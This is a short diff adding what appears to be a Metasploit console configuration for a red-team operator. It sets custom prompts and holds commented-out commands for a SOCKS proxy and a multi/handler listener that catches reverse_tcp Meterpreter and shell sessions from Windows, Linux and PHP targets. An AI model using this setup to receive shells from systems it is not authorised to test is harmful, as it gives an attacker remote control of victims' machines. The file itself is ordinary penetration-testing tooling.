@@ -1,0 +1,29 @@
+set Prompt [Operator Console]
+set MeterpreterPrompt [Meterpreter Beacon]
+
+# custom for your love
+# auto set up the socks proxy
+# use auxiliary/server/socks_proxy
+# set SRVPORT 1080
+# set VERSION 5
+# run -j
+
+# use multi/handler
+# Choose one of your payload
+# set payload windows/meterpreter/reverse_tcp
+# set payload windows/x64/meterpreter/reverse_tcp
+# set payload linux/x86/meterpreter/reverse_tcp
+# set payload linux/x64/meterpreter/reverse_tcp
+# set payload php/meterpreter/reverse_tcp
+# set payload generic/shell_reverse_tcp
+
+# set ExitOnSession false
+# set LHOST 0.0.0.0 
+# set LPORT 6789
+
+# run -j
+# Other payloads
+# set payload linux/x64/meterpreter/reverse_tcp
+# set LPORT 6790
+# 
+# run -j %                              
